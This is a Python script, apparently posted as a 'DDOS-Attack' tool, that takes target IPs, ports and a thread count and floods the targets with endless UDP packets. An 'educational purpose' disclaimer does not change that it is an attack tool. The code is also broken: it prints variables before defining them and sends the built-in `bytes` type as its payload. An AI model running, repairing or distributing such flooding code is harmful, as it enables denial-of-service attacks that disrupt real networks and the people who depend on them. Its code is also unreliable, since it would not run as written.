import os
import time
import socket
import scapy.all as scapy
import random
import threading

# DDOS-Attack [ASCII Art]


def display_banner():
    banner =  "██████╗ ██████╗  ██████╗ ███████╗       █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗\n"
    banner += "██╔══██╗██╔══██╗██╔═══██╗██╔════╝      ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝\n"
    banner += "██║  ██║██║  ██║██║   ██║███████╗█████╗███████║   ██║      ██║   ███████║██║     █████╔╝\n"
    banner += "██║  ██║██║  ██║██║   ██║╚════██║╚════╝██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗\n"
    banner += "██████╔╝██████╔╝╚██████╔╝███████║      ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗\n"
    banner += "╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝      ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝\n"
    print(banner)


display_banner()

# Terminal header settings and information
os.system('color 0A')
print("Developer  :   KARTHIK LAL (https://karthiklal.live)")
print("Created Date:   2022-03-09")
print('Project     :   DDOS-Attack')
print('Purpose     :   A simple DDOS-Attack tool to test your network security')
print('Caution     :   This tool is only for educational purpose. Do not use this for illegal purposes.')
print()

# Date and Time Declaration and Initialization
mydate = time.strftime('%Y-%m-%d')
mytime = time.strftime('%H-%M')

# Lets define sock and bytes for our attack
def send_packets(ip, port, bytes, proxy_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sent = 0
    while True:
        for i in range(proxy_size):
            sock.sendto(bytes, (ip, port))
            sent += 1
            port += 1
            if port == 65534:
                port = 1

# Type your ip and port number (find IP address using nslookup or any online website)
ips = input("IP Targets (separated by commas): ").split(',')
ports = input("Ports (separated by commas): ").split(',')
proxy_size = int(input("Proxy Size : "))
threads = int(input("Number of threads : "))

# Lets start the attack
print("Thank you for using the KARTHIK-LAL (DDOS-ATTACK-TOOL).")
print("Starting the attack on ", ip, " at port ", port, " with a proxy size of ", proxy_size, "...")

time.sleep(3)
for ip in ips:
    for port in ports:
        for i in range(threads):
            t = threading.Thread(target=send_packets, args=(ip, int(port), bytes, proxy_size))
            t.start()            

# End of the script
os.system("cls")
input("Press Enter to exit...")
